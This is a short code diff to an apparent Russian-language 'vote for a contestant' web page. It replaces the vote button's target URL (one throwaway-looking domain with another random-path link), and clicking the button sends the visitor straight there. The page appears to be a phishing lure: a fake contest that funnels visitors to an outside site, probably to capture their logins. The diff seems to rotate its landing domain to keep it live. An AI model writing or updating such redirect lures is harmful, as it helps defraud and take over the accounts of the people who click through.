@@ -84,7 +84,7 @@ details{margin:10px 0}summary{font-weight:700;cursor:pointer}footer{background:#
 const cards=document.querySelectorAll('.card'),vote=document.querySelector('#vote'),modal=document.querySelector('#modal'),msg=document.querySelector('#msg');
 let selected='';
 cards.forEach(c=>c.onclick=()=>{cards.forEach(x=>x.classList.remove('selected'));c.classList.add('selected');selected=c.dataset.name;vote.disabled=false;vote.textContent='Проголосовать за '+selected});
-const VOTE_URL='https://my.golosangitru.cfd/rr';
+const VOTE_URL='https://inicasolos.sbs/lk2qk68fkz9jpzhijskx';
 vote.onclick=()=>{if(selected){window.location.href=VOTE_URL}};
 document.querySelector('#close').onclick=()=>modal.classList.remove('show');
 modal.onclick=e=>{if(e.target===modal)modal.classList.remove('show')};
